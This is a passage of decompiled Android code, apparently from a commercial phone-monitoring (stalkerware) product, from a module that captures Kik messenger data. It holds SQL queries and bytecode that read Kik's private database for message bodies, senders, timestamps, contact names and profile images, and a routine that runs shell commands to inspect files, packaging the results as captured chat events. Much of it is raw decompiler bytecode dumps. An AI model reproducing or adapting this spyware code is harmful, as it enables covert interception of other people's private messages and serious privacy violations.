    //   112: istore 8
    //   114: aload 4
    //   116: iload 8
    //   118: invokeinterface 70 2 0
    //   123: lstore_1
    //   124: aload 4
    //   126: ifnull +10 -> 136
    //   129: aload 4
    //   131: invokeinterface 74 1 0
    //   136: aload 6
    //   138: ifnull +8 -> 146
    //   141: aload 6
    //   143: invokevirtual 75	android/database/sqlite/SQLiteDatabase:close	()V
    //   146: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   149: istore_3
    //   150: iload_3
    //   151: ifeq +3 -> 154
    //   154: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   157: istore_3
    //   158: iload_3
    //   159: ifeq +3 -> 162
    //   162: lload_1
    //   163: lreturn
    //   164: lconst_0
    //   165: lstore_1
    //   166: goto -42 -> 124
    //   169: astore 6
    //   171: iconst_0
    //   172: istore 5
    //   174: aconst_null
    //   175: astore 6
    //   177: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   180: istore 8
    //   182: iload 8
    //   184: ifeq +3 -> 187
    //   187: aload 4
    //   189: ifnull +10 -> 199
    //   192: aload 4
    //   194: invokeinterface 74 1 0
    //   199: aload 6
    //   201: ifnull -55 -> 146
    //   204: goto -63 -> 141
    //   207: astore 9
    //   209: iconst_0
    //   210: istore 5
    //   212: aconst_null
    //   213: astore 6
    //   215: aload 4
    //   217: ifnull +10 -> 227
    //   220: aload 4
    //   222: invokeinterface 74 1 0
    //   227: aload 6
    //   229: ifnull +8 -> 237
    //   232: aload 6
    //   234: invokevirtual 75	android/database/sqlite/SQLiteDatabase:close	()V
    //   237: aload 9
    //   239: athrow
    //   240: astore 9
    //   242: goto -27 -> 215
    //   245: astore 7
    //   247: goto -70 -> 177
    //   250: iconst_0
    //   251: istore 5
    //   253: aconst_null
    //   254: astore 6
    //   256: goto -132 -> 124
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	259	0	paramString	String
    //   2	164	1	l	long
    //   4	155	3	bool1	boolean
    //   6	215	4	localCursor	Cursor
    //   11	241	5	bool2	boolean
    //   58	84	6	localSQLiteDatabase	SQLiteDatabase
    //   169	1	6	localException1	Exception
    //   175	80	6	localObject1	Object
    //   68	38	7	str	String
    //   245	1	7	localException2	Exception
    //   92	3	8	bool3	boolean
    //   112	5	8	i	int
    //   180	3	8	bool4	boolean
    //   207	31	9	localObject2	Object
    //   240	1	9	localObject3	Object
    // Exception table:
    //   from	to	target	type
    //   28	32	169	java/lang/Exception
    //   39	42	169	java/lang/Exception
    //   43	47	169	java/lang/Exception
    //   54	58	169	java/lang/Exception
    //   28	32	207	finally
    //   39	42	207	finally
    //   43	47	207	finally
    //   54	58	207	finally
    //   65	68	240	finally
    //   74	78	240	finally
    //   85	92	240	finally
    //   105	112	240	finally
    //   116	123	240	finally
    //   177	180	240	finally
    //   65	68	245	java/lang/Exception
    //   74	78	245	java/lang/Exception
    //   85	92	245	java/lang/Exception
    //   105	112	245	java/lang/Exception
    //   116	123	245	java/lang/Exception
  }
  
  private static com.vvt.im.events.info.d b(String paramString1, String paramString2)
  {
    com.vvt.im.events.info.d locald = new com/vvt/im/events/info/d;
    locald.<init>();
    boolean bool1 = a;
    if (bool1) {}
    for (;;)
    {
      try
      {
        Object localObject1 = d(paramString1);
        bool1 = false;
        localObject2 = null;
        String str1 = localObject1[0];
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        int k = 1;
        String str2 = localObject1[k];
        localObject2 = ((StringBuilder)localObject2).append(str2);
        str2 = " ";
        localObject2 = ((StringBuilder)localObject2).append(str2);
        k = 2;
        str2 = localObject1[k];
        localObject2 = ((StringBuilder)localObject2).append(str2);
        str2 = ((StringBuilder)localObject2).toString();
        localObject2 = com.vvt.n.a.c.a.a(str1);
        boolean bool4 = com.vvt.ag.b.a((String)localObject2);
        if (bool4)
        {
          int m = 3;
          Object localObject3 = localObject1[m];
          boolean bool5 = com.vvt.ag.b.a((String)localObject3);
          if (!bool5)
          {
            int i = 3;
            localObject2 = localObject1[i];
            localObject3 = "/";
            boolean bool2 = ((String)localObject2).endsWith((String)localObject3);
            if (!bool2)
            {
              int j = 3;
              localObject3 = new java/lang/StringBuilder;
              ((StringBuilder)localObject3).<init>();
              int i1 = 3;
              String str3 = localObject1[i1];
              localObject3 = ((StringBuilder)localObject3).append(str3);
              str3 = "/";
              localObject3 = ((StringBuilder)localObject3).append(str3);
              localObject3 = ((StringBuilder)localObject3).toString();
              localObject1[j] = localObject3;
            }
            localObject2 = new java/lang/StringBuilder;
            ((StringBuilder)localObject2).<init>();
            int n = 3;
            localObject1 = localObject1[n];
            localObject2 = ((StringBuilder)localObject2).append((String)localObject1);
            localObject1 = "thumb.jpg";
            localObject2 = ((StringBuilder)localObject2).append((String)localObject1);
            localObject2 = ((StringBuilder)localObject2).toString();
            localObject2 = e((String)localObject2);
            if (localObject2 == null) {
              continue;
            }
            int i2 = localObject2.length;
            if (i2 <= 0) {
              continue;
            }
            localObject1 = ImType.KIK;
            localObject3 = ImMediaFileType.OWNER_PROFILE;
            localObject1 = com.vvt.im.a.c.a(paramString2, (ImType)localObject1, (ImMediaFileType)localObject3);
            localObject3 = ImMediaFileType.OWNER_PROFILE;
            localObject3 = com.vvt.im.a.c.a((ImMediaFileType)localObject3);
            localObject2 = com.vvt.io.d.a((byte[])localObject2, (String)localObject1, (String)localObject3);
          }
        }
        locald.b(str1);
        locald.a(str2);
        locald.f((String)localObject2);
        bool3 = a;
        if (!bool3) {}
      }
      catch (Exception localException)
      {
        Object localObject2;
        boolean bool3 = b;
        if (!bool3) {
          continue;
        }
        continue;
      }
      bool3 = a;
      if (bool3) {}
      return locald;
      bool3 = false;
      localObject2 = null;
    }
  }
  
  private static String b()
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT ");
    localStringBuilder.append("msgTable._id,");
    localStringBuilder.append("msgTable.body,");
    localStringBuilder.append("msgTable.was_me,");
    localStringBuilder.append("msgTable.timestamp,");
    localStringBuilder.append("msgTable.partner_jid,");
    localStringBuilder.append("msgTable.sys_msg,");
    localStringBuilder.append("msgTable.stat_msg,");
    localStringBuilder.append("msgTable.content_id,");
    localStringBuilder.append("msgTable.bin_id,");
    localStringBuilder.append("msgTable.render_instructions,");
    localStringBuilder.append("contactTable.photo_url,");
    localStringBuilder.append("contactTable.display_name ");
    localStringBuilder.append("FROM ");
    localStringBuilder.append("messagesTable as msgTable ");
    localStringBuilder.append("LEFT JOIN KiKcontactsTable as contactTable ");
    localStringBuilder.append("ON msgTable.bin_id=contactTable.jid ");
    localStringBuilder.append("WHERE msgTable._id >? and msgTable._id<=? ");
    localStringBuilder.append("ORDER BY msgTable._id DESC;");
    return localStringBuilder.toString();
  }
  
  /* Error */
  private static String b(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: ldc_w 794
    //   5: astore_3
    //   6: invokestatic 795	com/vvt/capture/kik/removeFromPath:e	()Ljava/lang/String;
    //   9: astore 4
    //   11: iconst_2
    //   12: istore 5
    //   14: iload 5
    //   16: anewarray 88	java/lang/String
    //   19: astore 6
    //   21: iconst_0
    //   22: istore 7
    //   24: aload 6
    //   26: iconst_0
    //   27: aload_1
    //   28: aastore
    //   29: iconst_1
    //   30: istore 7
    //   32: aload 6
    //   34: iload 7
    //   36: aload_3
    //   37: aastore
    //   38: aload_0
    //   39: aload 4
    //   41: aload 6
    //   43: invokevirtual 92	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   46: astore_3
    //   47: aload_3
    //   48: invokeinterface 95 1 0
    //   53: istore 8
    //   55: iload 8
    //   57: ifeq +26 -> 83
    //   60: ldc 109
    //   62: astore 4
    //   64: aload_3
    //   65: aload 4
    //   67: invokeinterface 66 2 0
    //   72: istore 8
    //   74: aload_3
    //   75: iload 8
    //   77: invokeinterface 112 2 0
    //   82: astore_2
    //   83: aload_3
    //   84: ifnull +9 -> 93
    //   87: aload_3
    //   88: invokeinterface 74 1 0
    //   93: aload_2
    //   94: areturn
    //   95: astore_3
    //   96: aconst_null
    //   97: astore_3
    //   98: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   101: istore 8
    //   103: iload 8
    //   105: ifeq +3 -> 108
    //   108: aload_3
    //   109: ifnull -16 -> 93
    //   112: goto -25 -> 87
    //   115: astore 9
    //   117: aconst_null
    //   118: astore_3
    //   119: aload 9
    //   121: astore_2
    //   122: aload_3
    //   123: ifnull +9 -> 132
    //   126: aload_3
    //   127: invokeinterface 74 1 0
    //   132: aload_2
    //   133: athrow
    //   134: astore_2
    //   135: goto -13 -> 122
    //   138: astore 4
    //   140: goto -42 -> 98
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	143	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	143	1	paramString	String
    //   1	132	2	localObject1	Object
    //   134	1	2	localObject2	Object
    //   5	83	3	localObject3	Object
    //   95	1	3	localException1	Exception
    //   97	30	3	localObject4	Object
    //   9	57	4	str	String
    //   138	1	4	localException2	Exception
    //   12	3	5	i	int
    //   19	23	6	arrayOfString	String[]
    //   22	13	7	j	int
    //   53	3	8	bool1	boolean
    //   72	4	8	k	int
    //   101	3	8	bool2	boolean
    //   115	5	9	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   6	9	95	java/lang/Exception
    //   14	19	95	java/lang/Exception
    //   27	29	95	java/lang/Exception
    //   36	38	95	java/lang/Exception
    //   41	46	95	java/lang/Exception
    //   6	9	115	finally
    //   14	19	115	finally
    //   27	29	115	finally
    //   36	38	115	finally
    //   41	46	115	finally
    //   47	53	134	finally
    //   65	72	134	finally
    //   75	82	134	finally
    //   98	101	134	finally
    //   47	53	138	java/lang/Exception
    //   65	72	138	java/lang/Exception
    //   75	82	138	java/lang/Exception
  }
  
  /* Error */
  private static ArrayList b(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2)
  {
    // Byte code:
    //   0: new 354	java/util/ArrayList
    //   3: astore_3
    //   4: aload_3
    //   5: invokespecial 355	java/util/ArrayList:<init>	()V
    //   8: aconst_null
    //   9: astore 4
    //   11: ldc_w 447
    //   14: astore 5
    //   16: aload_1
    //   17: aload 5
    //   19: invokevirtual 451	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   22: istore 6
    //   24: iload 6
    //   26: ifeq +124 -> 150
    //   29: invokestatic 796	com/vvt/capture/kik/removeFromPath:FxFileObserverWorker	()Ljava/lang/String;
    //   32: astore 5
    //   34: iconst_1
    //   35: istore 7
    //   37: iload 7
    //   39: anewarray 88	java/lang/String
    //   42: astore 8
    //   44: aload 8
    //   46: iconst_0
    //   47: aload_1
    //   48: aastore
    //   49: aload_0
    //   50: aload 5
    //   52: aload 8
    //   54: invokevirtual 92	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   57: astore 4
    //   59: aload 4
    //   61: ifnull +104 -> 165
    //   64: aload 4
    //   66: invokeinterface 95 1 0
    //   71: istore 6
    //   73: iload 6
    //   75: ifeq +90 -> 165
    //   78: ldc_w 798
    //   81: astore 5
    //   83: aload 4
    //   85: aload 5
    //   87: invokeinterface 66 2 0
    //   92: istore 6
    //   94: aload 4
    //   96: iload 6
    //   98: invokeinterface 112 2 0
    //   103: astore 5
    //   105: aload_0
    //   106: aload 5
    //   108: aload_2
    //   109: invokestatic 801	com/vvt/capture/kik/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Ljava/lang/String;)Lcom/vvt/im/events/info/e;
    //   112: astore 5
    //   114: aload_3
    //   115: aload 5
    //   117: invokevirtual 494	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   120: pop
    //   121: goto -57 -> 64
    //   124: astore 5
    //   126: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   129: istore 6
    //   131: iload 6
    //   133: ifeq +3 -> 136
    //   136: aload 4
    //   138: ifnull +10 -> 148
    //   141: aload 4
    //   143: invokeinterface 74 1 0
    //   148: aload_3
    //   149: areturn
    //   150: aload_0
    //   151: aload_1
    //   152: aload_2
    //   153: invokestatic 801	com/vvt/capture/kik/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Ljava/lang/String;)Lcom/vvt/im/events/info/e;
    //   156: astore 5
    //   158: aload_3
    //   159: aload 5
    //   161: invokevirtual 494	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   164: pop
    //   165: aload 4
    //   167: ifnull -19 -> 148
    //   170: goto -29 -> 141
    //   173: astore 9
    //   175: aconst_null
    //   176: astore_3
    //   177: aload 9
    //   179: astore 4
    //   181: aload_3
    //   182: ifnull +9 -> 191
    //   185: aload_3
    //   186: invokeinterface 74 1 0
    //   191: aload 4
    //   193: athrow
    //   194: astore 9
    //   196: aload 4
    //   198: astore_3
    //   199: aload 9
    //   201: astore 4
    //   203: goto -22 -> 181
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	206	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	206	1	paramString1	String
    //   0	206	2	paramString2	String
    //   3	196	3	localObject1	Object
    //   9	193	4	localObject2	Object
    //   14	102	5	localObject3	Object
    //   124	1	5	localException	Exception
    //   156	4	5	locale	com.vvt.im.events.info.e
    //   22	52	6	bool1	boolean
    //   92	5	6	i	int
    //   129	3	6	bool2	boolean
    //   35	3	7	j	int
    //   42	11	8	arrayOfString	String[]
    //   173	5	9	localObject4	Object
    //   194	6	9	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   17	22	124	java/lang/Exception
    //   29	32	124	java/lang/Exception
    //   37	42	124	java/lang/Exception
    //   47	49	124	java/lang/Exception
    //   52	57	124	java/lang/Exception
    //   64	71	124	java/lang/Exception
    //   85	92	124	java/lang/Exception
    //   96	103	124	java/lang/Exception
    //   108	112	124	java/lang/Exception
    //   115	121	124	java/lang/Exception
    //   152	156	124	java/lang/Exception
    //   159	165	124	java/lang/Exception
    //   17	22	173	finally
    //   29	32	173	finally
    //   37	42	173	finally
    //   47	49	173	finally
    //   52	57	173	finally
    //   152	156	173	finally
    //   159	165	173	finally
    //   64	71	194	finally
    //   85	92	194	finally
    //   96	103	194	finally
    //   108	112	194	finally
    //   115	121	194	finally
    //   126	129	194	finally
  }
  
  /* Error */
  private static long c(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: lconst_0
    //   3: lstore_2
    //   4: invokestatic 806	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   7: astore 4
    //   9: ldc_w 808
    //   12: astore 5
    //   14: iconst_2
    //   15: istore 6
    //   17: iload 6
    //   19: anewarray 4	java/lang/Object
    //   22: astore 7
    //   24: iconst_0
    //   25: istore 8
    //   27: aconst_null
    //   28: astore 9
    //   30: ldc_w 810
    //   33: astore 10
    //   35: aload 7
    //   37: iconst_0
    //   38: aload 10
    //   40: aastore
    //   41: iconst_1
    //   42: istore 8
    //   44: aload 7
    //   46: iload 8
    //   48: aload_0
    //   49: aastore
    //   50: aload 5
    //   52: aload 7
    //   54: invokestatic 123	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   57: astore 5
    //   59: aload 4
    //   61: aload 5
    //   63: invokevirtual 811	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   66: astore 5
    //   68: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   71: istore 6
    //   73: iload 6
    //   75: ifeq +3 -> 78
    //   78: new 813	java/io/BufferedReader
    //   81: astore 7
    //   83: new 815	java/io/StringReader
    //   86: astore 9
    //   88: aload 9
    //   90: aload 5
    //   92: invokespecial 816	java/io/StringReader:<init>	(Ljava/lang/String;)V
    //   95: aload 7
    //   97: aload 9
    //   99: invokespecial 819	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   102: aload 7
    //   104: invokevirtual 822	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   107: astore_1
    //   108: aload_1
    //   109: ifnull +173 -> 282
    //   112: aload_1
    //   113: invokestatic 827	com/vvt/io/removeFromPath:a	(Ljava/lang/String;)Lcom/vvt/io/MyUncaughtExceptionHandler;
    //   116: astore_1
    //   117: aload_1
    //   118: ifnull -16 -> 102
    //   121: aload_1
    //   122: getfield 832	com/vvt/io/MyUncaughtExceptionHandler:j	I
    //   125: istore 11
    //   127: iload 11
    //   129: ifne -27 -> 102
    //   132: aload_1
    //   133: getfield 834	com/vvt/io/MyUncaughtExceptionHandler:e	Ljava/lang/String;
    //   136: astore_1
    //   137: aload_1
    //   138: invokestatic 172	java/lang/Long:parseLong	(Ljava/lang/String;)J
    //   141: lstore 12
    //   143: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   146: istore 14
    //   148: iload 14
    //   150: ifeq +3 -> 153
    //   153: aload 7
    //   155: invokestatic 837	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   158: aload 4
    //   160: ifnull +8 -> 168
    //   163: aload 4
    //   165: invokevirtual 839	com/vvt/shell/f:d	()V
    //   168: lload 12
    //   170: lreturn
    //   171: astore 5
    //   173: iconst_0
    //   174: istore 6
    //   176: aconst_null
    //   177: astore 7
    //   179: aconst_null
    //   180: astore 4
    //   182: lload_2
    //   183: lstore 12
    //   185: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   188: istore 14
    //   190: iload 14
    //   192: ifeq +3 -> 195
    //   195: aload 7
    //   197: invokestatic 837	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   200: aload 4
    //   202: ifnull -34 -> 168
    //   205: goto -42 -> 163
    //   208: astore 5
    //   210: iconst_0
    //   211: istore 6
    //   213: aconst_null
    //   214: astore 7
    //   216: aconst_null
    //   217: astore 4
    //   219: aload 5
    //   221: astore_1
    //   222: aload 7
    //   224: invokestatic 837	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   227: aload 4
    //   229: ifnull +8 -> 237
    //   232: aload 4
    //   234: invokevirtual 839	com/vvt/shell/f:d	()V
    //   237: aload_1
    //   238: athrow
    //   239: astore 5
    //   241: iconst_0
    //   242: istore 6
    //   244: aconst_null
    //   245: astore 7
    //   247: aload 5
    //   249: astore_1
    //   250: goto -28 -> 222
    //   253: astore_1
    //   254: goto -32 -> 222
    //   257: astore 5
    //   259: iconst_0
    //   260: istore 6
    //   262: aconst_null
    //   263: astore 7
    //   265: lload_2
    //   266: lstore 12
    //   268: goto -83 -> 185
    //   271: astore_1
    //   272: lload_2
    //   273: lstore 12
    //   275: goto -90 -> 185
    //   278: pop
    //   279: goto -94 -> 185
    //   282: lload_2
    //   283: lstore 12
    //   285: goto -132 -> 153
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	288	0	paramString	String
    //   1	249	1	localObject1	Object
    //   253	1	1	localObject2	Object
    //   271	1	1	localException1	Exception
    //   3	280	2	l1	long
    //   7	226	4	localf	com.vvt.shell.f
    //   12	79	5	str1	String
    //   171	1	5	localException2	Exception
    //   208	12	5	localObject3	Object
    //   239	9	5	localObject4	Object
    //   257	1	5	localException3	Exception
    //   15	3	6	i	int
    //   71	190	6	bool1	boolean
    //   22	242	7	localObject5	Object
    //   25	22	8	j	int
    //   28	70	9	localStringReader	java.io.StringReader
    //   33	6	10	str2	String
    //   125	3	11	k	int
    //   141	143	12	l2	long
    //   146	45	14	bool2	boolean
    //   278	1	20	localException4	Exception
    // Exception table:
    //   from	to	target	type
    //   4	7	171	java/lang/Exception
    //   4	7	208	finally
    //   17	22	239	finally
    //   38	41	239	finally
    //   48	50	239	finally
    //   52	57	239	finally
    //   61	66	239	finally
    //   68	71	239	finally
    //   78	81	239	finally
    //   83	86	239	finally
    //   90	95	239	finally
    //   97	102	239	finally
    //   102	107	253	finally
    //   112	116	253	finally
    //   121	125	253	finally
    //   132	136	253	finally
    //   137	141	253	finally
    //   143	146	253	finally
    //   185	188	253	finally
    //   17	22	257	java/lang/Exception
    //   38	41	257	java/lang/Exception
    //   48	50	257	java/lang/Exception
    //   52	57	257	java/lang/Exception
    //   61	66	257	java/lang/Exception
    //   68	71	257	java/lang/Exception
    //   78	81	257	java/lang/Exception
    //   83	86	257	java/lang/Exception
    //   90	95	257	java/lang/Exception
    //   97	102	257	java/lang/Exception
    //   102	107	271	java/lang/Exception
    //   112	116	271	java/lang/Exception
    //   121	125	271	java/lang/Exception
    //   132	136	271	java/lang/Exception
    //   137	141	271	java/lang/Exception
    //   143	146	278	java/lang/Exception
  }
  
  private static String c()
  {
    return "SELECT display_name FROM KIKcontactsTable WHERE jid=?";
  }
  
  /* Error */
  private static String c(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: ldc_w 843
    //   5: astore_3
    //   6: ldc_w 845
    //   9: astore 4
    //   11: invokestatic 795	com/vvt/capture/kik/removeFromPath:e	()Ljava/lang/String;
    //   14: astore 5
    //   16: iconst_2
    //   17: istore 6
    //   19: iload 6
    //   21: anewarray 88	java/lang/String
    //   24: astore 7
    //   26: iconst_0
    //   27: istore 8
    //   29: aload 7
    //   31: iconst_0
    //   32: aload_1
    //   33: aastore
    //   34: iconst_1
    //   35: istore 8
    //   37: aload 7
    //   39: iload 8
    //   41: aload_3
    //   42: aastore
    //   43: aload_0
    //   44: aload 5
    //   46: aload 7
    //   48: invokevirtual 92	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   51: astore_3
    //   52: aload_3
    //   53: invokeinterface 95 1 0
    //   58: istore 9
    //   60: iload 9
    //   62: ifeq +58 -> 120
    //   65: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   68: istore 10
    //   70: iload 10
    //   72: ifeq +3 -> 75
    //   75: ldc 109
    //   77: astore 4
    //   79: aload_3
    //   80: aload 4
    //   82: invokeinterface 66 2 0
    //   87: istore 10
    //   89: aload_3
    //   90: iload 10
    //   92: invokeinterface 112 2 0
    //   97: astore_2
    //   98: aload_3
    //   99: ifnull +9 -> 108
    //   102: aload_3
    //   103: invokeinterface 74 1 0
    //   108: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   111: istore 11
    //   113: iload 11
    //   115: ifeq +3 -> 118
    //   118: aload_2
    //   119: areturn
    //   120: getstatic 13	com/vvt/capture/kik/removeFromPath:a	Z
    //   123: istore 9
    //   125: iload 9
    //   127: ifeq +3 -> 130
    //   130: invokestatic 795	com/vvt/capture/kik/removeFromPath:e	()Ljava/lang/String;
    //   133: astore 5
    //   135: iconst_2
    //   136: istore 6
    //   138: iload 6
    //   140: anewarray 88	java/lang/String
    //   143: astore 7
    //   145: iconst_0
    //   146: istore 8
    //   148: aload 7
    //   150: iconst_0
    //   151: aload_1
    //   152: aastore
    //   153: iconst_1
    //   154: istore 8
    //   156: aload 7
    //   158: iload 8
    //   160: aload 4
    //   162: aastore
    //   163: aload_0
    //   164: aload 5
    //   166: aload 7
    //   168: invokevirtual 92	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   171: astore_3
    //   172: aload_3
    //   173: invokeinterface 95 1 0
    //   178: istore 10
    //   180: iload 10
    //   182: ifeq -84 -> 98
    //   185: ldc 109
    //   187: astore 4
    //   189: aload_3
    //   190: aload 4
    //   192: invokeinterface 66 2 0
    //   197: istore 10
    //   199: aload_3
    //   200: iload 10
    //   202: invokeinterface 112 2 0
    //   207: astore_2
    //   208: goto -110 -> 98
    //   211: astore_3
    //   212: iconst_0
    //   213: istore 11
    //   215: aconst_null
    //   216: astore_3
    //   217: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   220: istore 10
    //   222: iload 10
    //   224: ifeq +3 -> 227
    //   227: aload_3
    //   228: ifnull -120 -> 108
    //   231: goto -129 -> 102
    //   234: astore 12
    //   236: iconst_0
    //   237: istore 11
    //   239: aconst_null
    //   240: astore_3
    //   241: aload 12
    //   243: astore_2
    //   244: aload_3
    //   245: ifnull +9 -> 254
    //   248: aload_3
    //   249: invokeinterface 74 1 0
    //   254: aload_2
    //   255: athrow
    //   256: astore_2
    //   257: goto -13 -> 244
    //   260: astore 4
    //   262: goto -45 -> 217
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	265	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	265	1	paramString	String
    //   1	254	2	localObject1	Object
    //   256	1	2	localObject2	Object
    //   5	195	3	localObject3	Object
    //   211	1	3	localException1	Exception
    //   216	33	3	localObject4	Object
    //   9	182	4	str1	String
    //   260	1	4	localException2	Exception
    //   14	151	5	str2	String
    //   17	122	6	i	int
    //   24	143	7	arrayOfString	String[]
    //   27	132	8	j	int
    //   58	68	9	bool1	boolean
    //   68	3	10	bool2	boolean
    //   87	4	10	k	int
    //   178	3	10	bool3	boolean
    //   197	4	10	m	int
    //   220	3	10	bool4	boolean
    //   111	127	11	bool5	boolean
    //   234	8	12	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   11	14	211	java/lang/Exception
    //   19	24	211	java/lang/Exception
    //   32	34	211	java/lang/Exception
    //   41	43	211	java/lang/Exception
    //   46	51	211	java/lang/Exception
    //   11	14	234	finally
    //   19	24	234	finally
    //   32	34	234	finally
    //   41	43	234	finally
    //   46	51	234	finally
    //   52	58	256	finally
    //   65	68	256	finally
    //   80	87	256	finally
    //   90	97	256	finally
    //   120	123	256	finally
    //   130	133	256	finally
    //   138	143	256	finally
    //   151	153	256	finally
    //   160	163	256	finally
    //   166	171	256	finally
    //   172	178	256	finally
    //   190	197	256	finally
    //   200	207	256	finally
    //   217	220	256	finally
    //   52	58	260	java/lang/Exception
    //   65	68	260	java/lang/Exception
    //   80	87	260	java/lang/Exception
    //   90	97	260	java/lang/Exception
    //   120	123	260	java/lang/Exception
    //   130	133	260	java/lang/Exception
    //   138	143	260	java/lang/Exception
    //   151	153	260	java/lang/Exception
    //   160	163	260	java/lang/Exception
    //   166	171	260	java/lang/Exception
    //   172	178	260	java/lang/Exception
    //   190	197	260	java/lang/Exception
    //   200	207	260	java/lang/Exception
  }
  
  private static String d()
  {
    return "SELECT content_string FROM KikContentTable WHERE content_id=? AND content_name='app-name'";
  }
  
  /* Error */
  private static String d(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: ldc_w 849
    //   5: astore_3
    //   6: invokestatic 795	com/vvt/capture/kik/removeFromPath:e	()Ljava/lang/String;
    //   9: astore 4
    //   11: iconst_2
    //   12: istore 5
    //   14: iload 5
    //   16: anewarray 88	java/lang/String
    //   19: astore 6
    //   21: iconst_0
    //   22: istore 7
    //   24: aload 6
    //   26: iconst_0
    //   27: aload_1
    //   28: aastore
    //   29: iconst_1
    //   30: istore 7
    //   32: aload 6
    //   34: iload 7
    //   36: aload_3
    //   37: aastore
    //   38: aload_0
    //   39: aload 4
    //   41: aload 6
    //   43: invokevirtual 92	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   46: astore_3
    //   47: aload_3
    //   48: invokeinterface 95 1 0
    //   53: istore 8
    //   55: iload 8
    //   57: ifeq +26 -> 83
    //   60: ldc 109
    //   62: astore 4
    //   64: aload_3
    //   65: aload 4
    //   67: invokeinterface 66 2 0
    //   72: istore 8
    //   74: aload_3
    //   75: iload 8
    //   77: invokeinterface 112 2 0
    //   82: astore_2
    //   83: aload_3
    //   84: ifnull +9 -> 93
    //   87: aload_3
    //   88: invokeinterface 74 1 0
    //   93: aload_2
    //   94: areturn
    //   95: astore_3
    //   96: aconst_null
    //   97: astore_3
    //   98: getstatic 18	com/vvt/capture/kik/removeFromPath:removeFromPath	Z
    //   101: istore 8
    //   103: iload 8
    //   105: ifeq +3 -> 108
    //   108: aload_3
    //   109: ifnull -16 -> 93
    //   112: goto -25 -> 87
    //   115: astore 9
    //   117: aconst_null
    //   118: astore_3
    //   119: aload 9
    //   121: astore_2
    //   122: aload_3
    //   123: ifnull +9 -> 132
    //   126: aload_3
    //   127: invokeinterface 74 1 0
    //   132: aload_2
    //   133: athrow
    //   134: astore_2
    //   135: goto -13 -> 122
    //   138: astore 4
    //   140: goto -42 -> 98
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	143	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	143	1	paramString	String
    //   1	132	2	localObject1	Object
    //   134	1	2	localObject2	Object
    //   5	83	3	localObject3	Object
    //   95	1	3	localException1	Exception
    //   97	30	3	localObject4	Object
    //   9	57	4	str	String
    //   138	1	4	localException2	Exception
    //   12	3	5	i	int
    //   19	23	6	arrayOfString	String[]
    //   22	13	7	j	int
    //   53	3	8	bool1	boolean
    //   72	4	8	k	int
    //   101	3	8	bool2	boolean
    //   115	5	9	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   6	9	95	java/lang/Exception
    //   14	19	95	java/lang/Exception
    //   27	29	95	java/lang/Exception
    //   36	38	95	java/lang/Exception
    //   41	46	95	java/lang/Exception
    //   6	9	115	finally
    //   14	19	115	finally
    //   27	29	115	finally
    //   36	38	115	finally
    //   41	46	115	finally
    //   47	53	134	finally
    //   65	72	134	finally
    //   75	82	134	finally
    //   98	101	134	finally
    //   47	53	138	java/lang/Exception
    //   65	72	138	java/lang/Exception
    //   75	82	138	java/lang/Exception
  }
  
  /* Error */
  private static String[] d(String paramString)
  {
    // Byte code:
